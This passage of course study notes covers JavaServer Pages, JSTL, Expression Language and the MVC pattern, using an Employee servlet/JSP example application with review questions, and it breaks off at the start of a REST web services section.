| `DataAccessObject<T>` | `database` | Interface: `access()` + `getOutputParam()` |
| `AbstractDAO<T>` | `database` | Base: manages connection lifecycle, rollback, one-shot guard |
| `CreateEmployeeDAO` | `database` | INSERT employee; no output param |
| `SearchEmployeeBySalaryDAO` | `database` | SELECT employees by salary; returns `List<Employee>` |
| `AbstractDatabaseServlet` | `servlet` | Base servlet: JNDI lookup in `init()`, `getConnection()` helper |
| `CreateEmployeeServlet` | `servlet` | POST handler: parse → DAO → respond |
| `SearchEmployeeBySalaryServlet` | `servlet` | POST handler: parse → DAO → respond with table |
| `context.xml` | `META-INF` | Defines Tomcat JDBC connection pool (JNDI resource) |
| `web.xml` | `WEB-INF` | Declares servlets, URL mappings, JNDI resource-ref |
| `PreparedStatement` | JDBC | Parameterized SQL — prevents SQL injection |
| JNDI | Tomcat | Directory service for looking up the connection pool |
| Connection Pool | Tomcat | Reuses DB connections; avoids per-request connection overhead |

## Questions

1. How do the client tier, web tier, API layer, database tier, and infrastructure components combine in the full-stack web application architecture?
2. Why should SQL logic be isolated inside DAO classes instead of being written directly inside servlets?
3. What makes the `Employee` and `Message` resource classes useful for passing domain data and structured outcomes through the application?
4. Why are immutable resource classes with `final` fields and getters often safer than mutable objects in request processing?
5. How does the generic `DataAccessObject<T>` interface support both commands with no output and queries returning values such as `List<Employee>`?
6. What responsibilities does `AbstractDAO` centralize, and why are connection closing, rollback, and one-shot execution handled there?
7. How does `CreateEmployeeDAO` use `PreparedStatement` placeholders to insert an employee safely?
8. How does `SearchEmployeeBySalaryDAO` transform a `ResultSet` into a list of `Employee` objects?
9. Why is opening a new database connection for every request expensive, and how does a Tomcat connection pool reduce that cost?
10. How do `context.xml`, `web.xml`, JNDI, and `AbstractDatabaseServlet` work together to provide database connections to servlets?
11. What is the purpose of pool parameters such as `testOnBorrow`, `validationQuery`, `maxActive`, `maxWait`, and `removeAbandoned`?
12. How does the create-employee sequence move from an HTTP POST request to an inserted database row and an HTML response?
13. How does the search-by-salary sequence use `access().getOutputParam()` to retrieve data for the response?
14. How do the error codes `E100`, `E200`, and `E300` distinguish validation, unexpected SQL errors, and duplicate keys?
15. Why does the DAO pattern make SQL injection protection easier to enforce across the application?

# Introduction to Java Server Pages (JSP)

## Table of Contents

- [[#JavaServer Pages (JSP)|JavaServer Pages (JSP)]]
  - [[#Why JSP|Why JSP]]
  - [[#JSP Execution Model|JSP Execution Model]]
  - [[#Components of a JSP Page|Components of a JSP Page]]
- [[#JavaBeans|JavaBeans]]
- [[#Standard Actions|Standard Actions]]
- [[#JSP Standard Tag Library (JSTL)|JSP Standard Tag Library (JSTL)]]
  - [[#JSTL Core Actions|JSTL Core Actions]]
  - [[#JSTL Formatting Actions|JSTL Formatting Actions]]
  - [[#JSTL Functions|JSTL Functions]]
- [[#Expression Language (EL)|Expression Language (EL)]]
  - [[#EL Operators|EL Operators]]
  - [[#EL Implicit Variables|EL Implicit Variables]]
- [[#JSP Examples|JSP Examples]]
  - [[#Minimal JSP Page|Minimal JSP Page]]
  - [[#JSP with JSTL and Parameters|JSP with JSTL and Parameters]]
  - [[#Shared JSP Includes|Shared JSP Includes]]
- [[#Model-View-Controller (MVC) Paradigm|Model-View-Controller (MVC) Paradigm]]
  - [[#MVC Definition|MVC Definition]]
  - [[#MVC and Java Web Technologies|MVC and Java Web Technologies]]
  - [[#MVC and Application Layers|MVC and Application Layers]]
- [[#MVC Employee Application with JSP|MVC Employee Application with JSP]]
  - [[#MVC Mapping in the Employee App|MVC Mapping in the Employee App]]
  - [[#Key Difference: Forward vs Direct Response|Key Difference: Forward vs Direct Response]]
  - [[#Resource Classes as Almost JavaBeans|Resource Classes as Almost JavaBeans]]
  - [[#Servlet Controllers with JSP Forward|Servlet Controllers with JSP Forward]]
  - [[#JSP View Pages|JSP View Pages]]
  - [[#Sequence Diagrams|Sequence Diagrams]]
  - [[#Class Diagram|Class Diagram]]
  - [[#Maven POM for JSTL|Maven POM for JSTL]]
- [[#Summary Table|Summary Table]]

---

## JavaServer Pages (JSP)

### Why JSP

Creating HTML (CSS, JS) directly from servlets is **cumbersome**:
- No IDE support for writing HTML — it's just Java strings
- Prone to errors (unclosed tags, escaping issues)
- Hard to maintain and upgrade

**JavaServer Pages (JSP)** provides textual (HTML-like) specification of dynamic responses. Three core concepts:

1. **Template Data**: most of a page is static HTML — JSP handles this naturally
2. **Addition of Dynamic Data**: simple mechanisms to embed runtime values
3. **Encapsulation of Functionality**: via *JavaBeans* and *tag libraries* (JSTL)

Official reference: Jakarta Server Pages 3.0 specification, `https://jakarta.ee/specifications/pages/3.0/jakarta-server-pages-spec-3.0.html`.

### JSP Execution Model

> [!Important] JSP Compilation and Execution
> On the **first invocation**, the container:
> 1. Translates `hello.jsp` → `hello_jsp.java` (a servlet class)
> 2. Compiles `hello_jsp.java` → `hello_jsp.class`
> 3. Executes the class to serve the request
>
> **Subsequent invocations** reuse the compiled `.class` directly. The container can also **pre-compile** JSP pages before deployment.
>
> **Intuition:** JSP is syntactic sugar. Under the hood it's a servlet — it just lets you write HTML and embed Java/EL snippets instead of writing `out.printf("<html>...")`.

Flow: `hello.jsp` → (translation) → `hello_jsp.java` → (compilation) → `hello_jsp.class` → (execution) → `hello.html` sent to browser.
![[Pasted image 20260512115326.png|440]]
*Figure 1: Compilation and execution flow of a JSP page*

### Components of a JSP Page

| Component | Syntax | Purpose |
|-----------|--------|---------|
| **Template text** | plain HTML | Static content sent as-is |
| **Directive** `page` | `<%@ page … %>` | Page-level attributes (content type, imports, …) |
| **Directive** `include` | `<%@ include … %>` | Static file inclusion at translation time |
| **Directive** `taglib` | `<%@ taglib … %>` | Declare a tag library |
| **Standard action** | `<jsp:useBean>`, `<jsp:forward>`, … | Standard JSP operations (XML syntax) |
| **Custom action** | `<c:if>`, `<fmt:formatDate>`, … | JSTL or other tag library actions |
| **Scriptlet** | `<% … %>` | Raw Java code fragment (avoid!) |
| **Expression** | `<%= … %>` | Evaluates a Java expression and writes result |
| **Declaration** | `<%! … %>` | Declares variables/methods for the JSP class |
| **Expression Language** | `${…}` | Concise access to beans, scopes, parameters |

> [!Warning] Avoid Scriptlets
> Scriptlets (`<% %>`) embed raw Java in HTML — this defeats the purpose of JSP and makes code hard to maintain. Prefer EL (`${…}`) and JSTL tags (`<c:if>`, `<c:forEach>`, etc.) for all logic in JSP pages.

---

## JavaBeans

> [!Important] JavaBeans Convention
> A **JavaBean** is a Java class following specific naming conventions so that frameworks can manipulate it generically:
> - Must have a **no-argument constructor**
> - Fields exposed via **`getXXX()`** / **`setXXX()`** for a field named `XXX`
> - Boolean fields use **`isXXX()`** instead of `getXXX()`
>
> JSP and EL use these conventions to read/write bean properties without reflection boilerplate.
>
> **Intuition:** `${employee.badge}` in EL calls `employee.getBadge()` — EL knows this from the `get` + capitalization convention.

Reference specification: JavaBeans 1.01-A, `http://www.oracle.com/technetwork/java/javase/documentation/spec-136004.html`.

---

## Standard Actions

| Action              | Description                                                              |
| ------------------- | ------------------------------------------------------------------------ |
| `<jsp:useBean>`     | Instantiates (or locates) a JavaBean and makes it available to the page  |
| `<jsp:getProperty>` | Gets a bean property value and writes it to the response                 |
| `<jsp:setProperty>` | Sets a bean property value                                               |
| `<jsp:include>`     | Includes the response of another JSP/servlet (inside web container only) |
| `<jsp:forward>`     | Forwards processing to another JSP/servlet (inside web container only)   |
| `<jsp:param>`       | Adds parameters to a request made by `<jsp:include>` or `<jsp:forward>`  |
![[Pasted image 20260512115436.png|520]]
*Figure 2: Examples of JSP standard actions and their use in a page*

![[Pasted image 20260512115449.png|520]]
*Figure 3: Additional JSP standard action examples for including or forwarding requests*

---

## JSP Standard Tag Library (JSTL)

**JSTL** is a standardized collection of custom tag libraries covering common needs.

Official references: Jakarta Standard Tag Library 3.0.0, `https://projects.eclipse.org/projects/ee4j.jstl/releases/3.0.0`, and the JSTL API repository, `https://github.com/eclipse-ee4j/jstl-api`.

| Area | Prefix | URI | Purpose |
|------|--------|-----|---------|
| Core | `c` | `http://java.sun.com/jsp/jstl/core` | Conditionals, iteration, URL rewriting, import, redirect |
| XML Processing | `x` | `http://java.sun.com/jsp/jstl/xml` | XPath, XSLT processing |
| I18N Formatting | `fmt` | `http://java.sun.com/jsp/jstl/fmt` | Locale, date/number formatting, resource bundles |
| Relational DB | `sql` | `http://java.sun.com/jsp/jstl/sql` | Direct SQL from JSP (avoid in production) |
| Functions | `fn` | `http://java.sun.com/jsp/jstl/functions` | String utilities |

### JSTL Core Actions

| Action | Description |
|--------|-------------|
| `<c:out>` | Evaluates expression, writes to response — **escapes XML/HTML by default** |
| `<c:if>` | Conditional rendering — evaluates body only if condition true |
| `<c:choose>` | Switch-like: evaluates first matching `<c:when>`, or `<c:otherwise>` |
| `<c:forEach>` | Iterates over a collection or a numeric range |
| `<c:url>` | Constructs a URL applying session/rewrite rules; handles context path |
| `<c:import>` | Imports content of a resource (local or external URL) into response or variable |
| `<c:redirect>` | Sends HTTP redirect to client |
| `<c:param>` | Adds a parameter to `<c:url>`, `<c:import>`, or `<c:redirect>` |

> [!Important] Use `<c:out>` Not `${…}` for Output
> `<c:out value="${...}"/>` escapes XML characters (`<`, `>`, `&`, `"`, `'`) → prevents **XSS**. Bare `${...}` in template text does **not** escape. Always use `<c:out>` when outputting user-controlled data.

### JSTL Formatting Actions

| Action | Description |
|--------|-------------|
| `<fmt:setLocale>` | Sets locale (e.g., `en_UK`, `it_IT`) |
| `<fmt:setBundle>` | Sets the resource bundle for message localization |
| `<fmt:message>` | Outputs a localized message from the bundle |
| `<fmt:param>` | Provides a parameter for a localized message |
| `<fmt:formatNumber>` | Formats a number according to locale and format |
| `<fmt:formatDate>` | Formats a date/time according to locale and style |

### JSTL Functions

| Function | Description |
|----------|-------------|
| `fn:contains` | Checks if string contains a sub-string |
| `fn:endsWith` | Checks if string ends with a sub-string |
| `fn:escapeXml` | Escapes XML markup characters |
| `fn:length` | Returns string length or collection size |
| `fn:replace` | Replaces a sub-string |
| `fn:split` | Splits string into array |
| `fn:substring` | Extracts sub-string |

---

## Expression Language (EL)

Official references: Jakarta Expression Language 4.0 specification, `https://jakarta.ee/specifications/expression-language/4.0/jakarta-expression-language-spec-4.0.html`, and the EL implementation repository, `https://github.com/jakartaee/expression-language`.

### EL Operators

| Operator | Description |
|----------|-------------|
| `.` | Access JavaBean property or Map entry (`${employee.badge}` → `getBadge()`) |
| `[]` | Access array/List element (`${list[0]}`) |
| `()` | Grouping |
| `? :` | Conditional (ternary) |
| `+ - * / %` | Arithmetic |
| `< > <= >= == !=` | Relational |
| `&& \|\| !` | Boolean |
| `empty` | True if variable is null, empty string, empty array/collection |
| `func(arg)` | Invoke a JSTL function |

### EL Implicit Variables

| Variable | Description |
|----------|-------------|
| `pageScope` | Map of variables in **page** scope |
| `requestScope` | Map of variables in **request** scope |
| `sessionScope` | Map of variables in **session** scope |
| `applicationScope` | Map of variables in **application** (servlet context) scope |
| `param` | Map of request parameters (single-value strings) |
| `paramValues` | Map of request parameters (arrays of strings) |
| `header` | Map of HTTP headers (single-value strings) |
| `headerValues` | Map of HTTP headers (arrays of strings) |
| `cookie` | Map of cookies as `javax.servlet.http.Cookie` objects |

*(nota: scopes resolve in order page → request → session → application if no explicit prefix used)*

---

## JSP Examples

> [!Example] `web.xml` Welcome Page
> The basic JSP webapp maps the application welcome page to `jsp/index.jsp`:
>
> ```xml
> <web-app id="hello-world-jsp-form" version="2.5" ...>
>   <display-name>Basic Web Application with JavaServer Pages</display-name>
>   <description>Example of use of minimal JSP to create a Web application.</description>
>   <welcome-file-list>
>     <welcome-file>jsp/index.jsp</welcome-file>
>   </welcome-file-list>
> </web-app>
> ```

### Minimal JSP Page

> [!Example] hello-world.jsp — Minimal JSP
> ```jsp
> <%@ page contentType="text/html;charset=UTF-8" %>
> <!DOCTYPE html>
> <html lang="en">
>  <head>
>   <meta charset="utf-8">
>   <title>HelloWorld JSP Response</title>
>  </head>
>  <body>
>   <h1>HelloWorld JSP Response</h1>
>   <hr />
>   <p>Hello, world!</p>
>  </body>
> </html>
> ```
>
> **Explanation:** `<%@ page contentType="text/html;charset=UTF-8" %>` sets the `Content-Type` response header. Everything else is template text sent as-is.

### JSP with JSTL and Parameters

> [!Example] hello-world-param.jsp — JSTL conditionals and EL
> ```jsp
> <%@ page contentType="text/html;charset=UTF-8" %>
> <%@ taglib prefix="c"   uri="http://java.sun.com/jsp/jstl/core" %>
> <%@ taglib prefix="fmt" uri="http://java.sun.com/jsp/jstl/fmt" %>
>
> <!-- ... head and header ... -->
>
> <c:choose>
>     <c:when test="${empty param.helloName}">
>         <div class="alert alert-danger">Please, enter your name!</div>
>     </c:when>
>     <c:otherwise>
>         <div>Hello, <c:out value="${param.helloName}"/>!</div>
>     </c:otherwise>
> </c:choose>
>
> <!-- Display current date using a JavaBean and fmt tags -->
> <jsp:useBean id="now" class="java.util.Date"/>
> <fmt:setLocale value="en_UK"/>
> on <fmt:formatDate value="${now}" type="date" dateStyle="long"/>
> at <fmt:formatDate value="${now}" type="time" timeStyle="long"/>
> ```
>
> **Key points:**
> - `${empty param.helloName}` — EL `empty` operator checks for null/empty; `param` is the EL implicit Map of request parameters
> - `<c:out value="${param.helloName}"/>` — safe output with XML escaping
> - `<jsp:useBean id="now" class="java.util.Date"/>` — instantiates a `java.util.Date` and binds it to the name `now` in page scope
> - `<fmt:formatDate>` formats `${now}` per `en_UK` locale

> [!Warning] Always validate in the JSP even if form has `required`
> A JSP like `hello-world-param.jsp` can be called **directly** by URL without going through the form — bypassing the `required` attribute. Always validate parameters in the JSP (or servlet) regardless of HTML-side validation.

### Shared JSP Includes

**Pattern**: common fragments (header, footer, scripts) are factored into include files under `/jsp/include/`:

```
/jsp/include/head.jsp    — <meta>, CSS links (Bootstrap, FontAwesome)
/jsp/include/foot.jsp    — Bootstrap/jQuery JS scripts
/jsp/include/footer.jsp  — copyright footer markup
```

Referenced with `<c:import url="/jsp/include/head.jsp"/>` — this includes the *response* of the target JSP (dynamic include, evaluated at request time).

> [!Example] index.jsp — Composing the page from includes
> ```jsp
> <%@ page contentType="text/html;charset=UTF-8" %>
> <%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
>
> <!DOCTYPE html>
> <html lang="en">
> <head>
>     <c:import url="/jsp/include/head.jsp"/>
>     <title>Basic Web Application with JavaServer Pages</title>
> </head>
> <body>
> <div class="container">
>     <!-- ... header ... -->
>
>     <!-- URL resolved relative to webapp root using c:url -->
>     <img src="<c:url value="/media/hello.png"/>" alt="...">
>     <a href="<c:url value="/jsp/hello-world.jsp"/>">...</a>
>
>     <!-- footer -->
>     <c:import url="/jsp/include/footer.jsp"/>
> </div>
> <c:import url="/jsp/include/foot.jsp"/>
> </body>
> </html>
> ```
>
> **`<c:url>`**: always use this tag for URL resolution — it handles the webapp context path prefix and session URL rewriting automatically.

---

## Model-View-Controller (MVC) Paradigm

### MVC Definition

> [!Important] MVC Pattern
> **Model-View-Controller (MVC)** (Krasner & Pope, 1988) is an architectural pattern that separates an application into three roles:
>
> | Role | Responsibility | Interactions |
> |------|---------------|--------------|
> | **Model** | Holds application state and business logic | Queried/updated by Controller; notifies View of state changes |
> | **View** | Renders output to users | Reads from Model; receives selection from Controller |
> | **Controller** | Handles user input | Queries/updates Model; selects which View to display |
>
> **Intuition:** User clicks button → Controller handles event → updates Model → tells View to render → user sees result.

### MVC and Java Web Technologies

| MVC Role | Java Web Technology |
|----------|-------------------|
| **Model** | Java classes / *JavaBeans* (e.g., `Employee`, `Message`) |
| **View** | JSP pages (HTML, CSS, JS) |
| **Controller** | *Servlet* |

Flow: Browser → (HTTP request) → Servlet (Controller) → (invokes) → DAO (Model layer) → Servlet sets request attributes → (forwards) → JSP (View) → (HTML) → Browser.

### MVC and Application Layers
![[Pasted image 20260512115525.png|440]]
*Figure 4: MVC pattern schema applied to servlets, JSP pages, and the model*

![[jsp-mvc-layers-employee.jpg|500]]
*Figure 5: Mapping between MVC roles and the layers of the Employee application*

MVC roles map to application layers:

| MVC Role | Application Layer | In Employee App |
|----------|------------------|-----------------|
| **View** | Presentation Logic | `create-employee-form.jsp`, `create-employee-result.jsp`, `search-employee-form.jsp`, `search-employee-result.jsp` |
| **Controller** | Application Logic | `CreateEmployeeServlet`, `SearchEmployeeBySalaryServlet` |
| **Model** | Data Logic + Domain | `Employee`, `Message`, `CreateEmployeeDAO`, `SearchEmployeeBySalaryDAO` |

---

## MVC Employee Application with JSP

### MVC Mapping in the Employee App

```
Input from Users
    ↓
View (form JSPs)                   create-employee-form.jsp
                                   search-employee-form.jsp
    ↓ POST /create-employee
    ↓ POST /search-employee-by-salary

Controller (Servlets)              CreateEmployeeServlet
                                   SearchEmployeeBySalaryServlet
    ↓ INVOKE DAO
    ↓ FORWARD to result JSP

Model (resources + DAOs)           Employee, Message
                                   CreateEmployeeDAO, SearchEmployeeBySalaryDAO

View (result JSPs)                 create-employee-result.jsp
                                   search-employee-result.jsp
    ↓
Output to Users
```

### Key Difference: Forward vs Direct Response

> [!Important] Servlet → JSP via `RequestDispatcher.forward()`
> In the previous (servlet-only) approach, the servlet wrote HTML directly with `PrintWriter`.
>
> In the MVC approach:
> 1. Servlet sets **request attributes** with the model objects
> 2. Servlet calls `req.getRequestDispatcher("/jsp/view.jsp").forward(req, res)` — transfers control to the JSP
> 3. JSP reads the attributes via EL and renders HTML
>
> ```java
> // Servlet (Controller)
> req.setAttribute("employee", e);
> req.setAttribute("message", m);
> req.getRequestDispatcher("/jsp/create-employee-result.jsp").forward(req, res);
> ```
>
> ```jsp
> <%-- JSP (View) — reads request attributes via EL --%>
> <c:out value="${employee.badge}"/>
> <c:out value="${message.message}"/>
> ```
>
> **Intuition:** forward stays inside the server — the browser sees one HTTP response but two components collaborate to generate it.

### Resource Classes as Almost JavaBeans

The `Employee` and `Message` classes **partially** follow JavaBeans conventions:

| Convention | Employee/Message | Status |
|------------|-----------------|--------|
| No-arg constructor | ❌ Missing | Not full JavaBeans |
| `getXXX()` accessors | ✅ Present | Compliant |
| `isXXX()` for booleans | ✅ `isError()` | Compliant |
| `setXXX()` mutators | ❌ Missing (fields are `final`) | Not full JavaBeans |

They are **"almost JavaBeans"** — EL can call `getXXX()` methods via `${employee.badge}` syntax even without full compliance, as long as the getter naming convention is followed.

### Servlet Controllers with JSP Forward

> [!Example] CreateEmployeeServlet with JSP Forward
> ```java
> public final class CreateEmployeeServlet extends AbstractDatabaseServlet {
>
>     public void doPost(HttpServletRequest req, HttpServletResponse res)
>             throws ServletException, IOException {
>
>         LogContext.setIPAddress(req.getRemoteAddr());
>         LogContext.setAction(Actions.CREATE_EMPLOYEE);
>
>         int badge = -1; String surname = null; int age = -1; int salary = -1;
>         Employee e = null; Message m = null;
>
>         try {
>             badge   = Integer.parseInt(req.getParameter("badge"));
>             surname = req.getParameter("surname");
>             age     = Integer.parseInt(req.getParameter("age"));
>             salary  = Integer.parseInt(req.getParameter("salary"));
>             LogContext.setResource(req.getParameter("badge"));
>
>             e = new Employee(badge, surname, age, salary);
>             new CreateEmployeeDAO(getConnection(), e).access();
>             m = new Message(String.format("Employee %d successfully created.", badge));
>
>         } catch (NumberFormatException ex) {
>             m = new Message("Invalid parameters: badge, age, salary must be integer.", "E100", ex.getMessage());
>         } catch (SQLException ex) {
>             if (ex.getSQLState().equals("23505"))
>                 m = new Message(String.format("Employee %d already exists.", badge), "E300", ex.getMessage());
>             else
>                 m = new Message("Unexpected DB error.", "E200", ex.getMessage());
>         }
>
>         try {
>             // Set model objects as request attributes for the JSP
>             req.setAttribute("employee", e);
>             req.setAttribute("message", m);
>
>             // Forward to JSP view — JSP generates the HTML response
>             req.getRequestDispatcher("/jsp/create-employee-result.jsp").forward(req, res);
>
>         } catch (Exception ex) {
>             LOGGER.error("Unable to forward to JSP.", ex);
>             throw ex;
>         } finally {
>             LogContext.removeIPAddress();
>             LogContext.removeAction();
>             LogContext.removeResource();
>         }
>     }
> }
> ```

> [!Example] SearchEmployeeBySalaryServlet with JSP Forward
> ```java
> public final class SearchEmployeeBySalaryServlet extends AbstractDatabaseServlet {
>
>     public void doPost(HttpServletRequest req, HttpServletResponse res)
>             throws ServletException, IOException {
>
>         int salary = -1;
>         List<Employee> el = null; Message m = null;
>
>         try {
>             salary = Integer.parseInt(req.getParameter("salary"));
>             el = new SearchEmployeeBySalaryDAO(getConnection(), salary).access().getOutputParam();
>             m = new Message("Employees successfully searched.");
>         } catch (NumberFormatException ex) {
>             m = new Message("Salary must be integer.", "E100", ex.getMessage());
>         } catch (SQLException ex) {
>             m = new Message("Unexpected DB error.", "E200", ex.getMessage());
>         }
>
>         try {
>             // Set list and message as request attributes
>             req.setAttribute("employeeList", el);
>             req.setAttribute("message", m);
>
>             // Forward to JSP view
>             req.getRequestDispatcher("/jsp/search-employee-result.jsp").forward(req, res);
>         } catch (Exception ex) {
>             LOGGER.error("Unable to forward.", ex);
>             throw ex;
>         } finally {
>             LogContext.removeIPAddress();
>             LogContext.removeAction();
>             LogContext.removeUser();
>         }
>     }
> }
> ```

### JSP View Pages

> [!Example] JSP Form Pages — using `<c:url>` for action
> ```jsp
> <%@ page contentType="text/html;charset=utf-8" %>
> <%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
>
> <!-- Create Employee Form -->
> <form method="POST" action="<c:url value="/create-employee"/>">
>   <input name="badge"   type="text"/>
>   <input name="surname" type="text"/>
>   <input name="age"     type="text"/>
>   <input name="salary"  type="text"/>
>   <button type="submit">Submit</button>
>   <button type="reset">Reset the form</button>
> </form>
>
> <!-- Search Employee Form -->
> <form method="POST" action="<c:url value="/search-employee-by-salary"/>">
>   <input name="salary" type="text"/>
>   <button type="submit">Submit</button>
>   <button type="reset">Reset the form</button>
> </form>
> ```
>
> **Key**: `<c:url value="/create-employee"/>` prepends the webapp context path — required because the JSP is in `/jsp/` but the servlet is at the webapp root `/`.

> [!Example] create-employee-result.jsp — Render model via EL
> ```jsp
> <%@ page contentType="text/html;charset=utf-8" %>
> <%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
>
> <!DOCTYPE html>
> <html lang="en">
>  <head><title>Create Employee</title></head>
>  <body>
>   <h1>Create Employee</h1>
>   <hr/>
>
>   <!-- Delegate message rendering to reusable include -->
>   <c:import url="/jsp/include/show-message.jsp"/>
>
>   <!-- Show employee only if present and no error -->
>   <c:if test="${not empty employee && !message.error}">
>    <ul>
>     <li>badge:   <c:out value="${employee.badge}"/></li>
>     <li>surname: <c:out value="${employee.surname}"/></li>
>     <li>age:     <c:out value="${employee.age}"/></li>
>     <li>salary:  <c:out value="${employee.salary}"/></li>
>    </ul>
>   </c:if>
>  </body>
> </html>
> ```

> [!Example] show-message.jsp — Reusable error/success fragment
> ```jsp
> <%@ page contentType="text/html;charset=utf-8" %>
> <%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
>
> <c:choose>
>  <c:when test="${message.error}">
>   <ul>
>    <li>error code: <c:out value="${message.errorCode}"/></li>
>    <li>message:    <c:out value="${message.message}"/></li>
>    <li>details:    <c:out value="${message.errorDetails}"/></li>
>   </ul>
>  </c:when>
>  <c:otherwise>
>   <p><c:out value="${message.message}"/></p>
>  </c:otherwise>
> </c:choose>
> ```

> [!Example] search-employee-result.jsp — Iterate list with `<c:forEach>`
> ```jsp
> <%@ page contentType="text/html;charset=utf-8" %>
> <%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
>
> <body>
>  <h1>Search Employee</h1>
>  <hr/>
>  <c:import url="/jsp/include/show-message.jsp"/>
>
>  <c:if test="${not empty employeeList}">
>   <table>
>    <thead>
>     <tr><th>Badge</th><th>Surname</th><th>Age</th><th>Salary</th></tr>
>    </thead>
>    <tbody>
>     <c:forEach var="employee" items="${employeeList}">
>      <tr>
>       <td><c:out value="${employee.badge}"/></td>
>       <td><c:out value="${employee.surname}"/></td>
>       <td><c:out value="${employee.age}"/></td>
>       <td><c:out value="${employee.salary}"/></td>
>      </tr>
>     </c:forEach>
>    </tbody>
>   </table>
>  </c:if>
> </body>
> ```
>
> **`<c:forEach var="employee" items="${employeeList}">`** — `items` = EL expression for the `employeeList` request attribute (a `List<Employee>`); `var` = loop variable name accessible via EL within the body.

### Sequence Diagrams

![[jsp-create-employee-sequence.jpg|520]]
*Figure 6: MVC sequence for creating an employee*

**Create Employee (MVC) steps:**
1. Browser: `POST /create-employee`
2. Container instantiates `CreateEmployeeServlet`, calls `init()` → JNDI lookup
3. `service()` → `doPost()` → parse params → create `Employee` → `CreateEmployeeDAO.access()` → INSERT
4. Create `Message`
5. `req.setAttribute("employee", e)` + `req.setAttribute("message", m)` (1.4.8)
6. `getRequestDispatcher("/jsp/create-employee-result.jsp").forward(req, res)` (1.4.9)
7. JSP generates HTML (step 2)
8. Browser receives HTML (3.1)

![[jsp-search-employee-sequence.jpg|520]]
*Figure 7: MVC sequence for searching employees*

**Search Employee (MVC) steps:**
1. Browser: `POST /search-employee-by-salary`
2. `doPost()` → parse salary → `SearchEmployeeBySalaryDAO.access().getOutputParam()` → SELECT → `List<Employee>`
3. Create `Message`
4. `req.setAttribute("employeeList", el)` + `req.setAttribute("message", m)` (1.4.9)
5. Forward to `search-employee-result.jsp` (1.4.10)
6. JSP renders table (step 2) → HTML → Browser (3.1)

### Class Diagram

![[jsp-employee-class-diagram.jpg|560]]
*Figure 8: Class diagram of the JSP project with servlet controllers and JSP views*

Same class structure as the servlet-only version (slide 06) — the key addition is that servlets now **forward to JSP views** instead of writing HTML directly.

### Maven POM for JSTL

> [!Important] JSTL Scope Must NOT Be `provided`
> Unlike the servlet API and Tomcat JDBC pool, **JSTL taglibs are not bundled with Tomcat**. They must be packaged into the WAR:
>
> The project is packaged as a WAR and uses the Maven WAR plugin; JSP/JSTL libraries must be available in the packaged webapp unless the container explicitly provides them.
>
> ```xml
> <dependencies>
>   <dependency>
>     <groupId>javax.servlet</groupId>
>     <artifactId>javax.servlet-api</artifactId>
>     <version>4.0.0</version>
>     <scope>provided</scope>   <!-- Tomcat provides this -->
>   </dependency>
>
>   <!-- JSTL API + implementation — must be IN the WAR -->
>   <dependency>
>     <groupId>javax.servlet</groupId>
>     <artifactId>jstl</artifactId>
>     <version>1.2</version>
>     <!-- No scope = compile scope = bundled in WAR -->
>   </dependency>
> </dependencies>
> ```

---

## Summary Table

| Concept | Technology | Notes |
|---------|------------|-------|
| **JSP** | Template text + directives + tags + EL | Compiled to servlet on first access |
| **Directive `page`** | `<%@ page contentType="..." %>` | Sets response Content-Type |
| **Directive `taglib`** | `<%@ taglib prefix="c" uri="..." %>` | Declares JSTL or custom tags |
| **EL** | `${expression}` | Accesses beans, scopes, params — no Java code needed |
| **JavaBeans** | `getXXX()` / `isXXX()` convention | EL resolves `${obj.field}` to `obj.getField()` |
| **`<c:out>`** | JSTL Core | Escaped output — prevents XSS |
| **`<c:if>`** | JSTL Core | Conditional rendering |
| **`<c:choose>`** / `<c:when>` / `<c:otherwise>` | JSTL Core | Multi-branch conditional |
| **`<c:forEach>`** | JSTL Core | Iterate collections |
| **`<c:url>`** | JSTL Core | Context-aware URL resolution |
| **`<c:import>`** | JSTL Core | Dynamic include of another JSP/resource |
| **`<fmt:formatDate>`** | JSTL Fmt | Locale-aware date formatting |
| **`<jsp:useBean>`** | Standard action | Instantiate/find a JavaBean in a scope |
| **`RequestDispatcher.forward()`** | Servlet API | Transfers control server-side to a JSP |
| **`req.setAttribute()`** | Servlet API | Passes model objects to the JSP via request scope |
| **MVC — Model** | JavaBeans (`Employee`, `Message`) | Domain objects; DAOs for persistence |
| **MVC — View** | JSP pages | Presentation only; no business logic |
| **MVC — Controller** | Servlets | Parse request, call model, forward to view |
| **JSTL scope** | Maven: no `provided` | Must be bundled in WAR; Tomcat does not include it |

## Questions

1. Why does writing HTML directly with `PrintWriter` inside servlets become difficult to maintain as pages grow?
2. How does the JSP execution model translate a `.jsp` file into a servlet class, and why is the first invocation different from later ones?
3. What roles do template text, directives, standard actions, JSTL tags, scriptlets, expressions, declarations, and EL play inside a JSP page?
4. Why are scriptlets discouraged, and how do EL and JSTL provide a cleaner alternative?
5. How does the JavaBeans naming convention allow EL expressions such as `${employee.badge}` to access Java object properties?
6. Why is `<c:out>` safer than writing a bare `${...}` expression when displaying user-controlled data?
7. How do JSTL core tags such as `<c:if>`, `<c:choose>`, `<c:forEach>`, `<c:url>`, and `<c:import>` support view logic without raw Java code?
8. How do EL implicit variables such as `param`, `requestScope`, `sessionScope`, and `cookie` help JSP pages access web application data?
9. Why should a JSP validate parameters even when the corresponding HTML form uses `required` attributes?
10. How does `<c:url>` solve context-path and URL-rewriting problems in JSP links, images, and form actions?
11. How does MVC separate responsibilities among servlets, JSP pages, resource classes, and DAOs in the employee application?
12. What changes when a servlet forwards to a JSP with `RequestDispatcher.forward()` instead of writing the whole HTML response itself?
13. How do request attributes carry `Employee`, `Message`, or `employeeList` objects from the controller to the JSP view?
14. In the MVC sequence diagrams, where are database access, request attribute setup, forwarding, and HTML rendering performed?
15. Why must JSTL dependencies be bundled in the WAR instead of marked as `provided`?

# 08 — REST Web Services

_Source: `08-Webapp-2025-26-REST.pdf` — Web Applications, Master Degree, A.Y. 2025/2026, Prof. Nicola Ferro_

---

## Table of Contents

- [[#REST — The Architectural Paradigm|REST — The Architectural Paradigm]]
  - [[#Resources and URIs|Resources and URIs]]
  - [[#HTTP and REST — Uniform Interface|HTTP and REST — Uniform Interface]]
  - [[#Representations — XML, JSON, HTML|Representations — XML, JSON, HTML]]
  - [[#REST Design Principles|REST Design Principles]]
  - [[#API Documentation — WADL and OpenAPI|API Documentation — WADL and OpenAPI]]
- [[#Employee REST API|Employee REST API]]
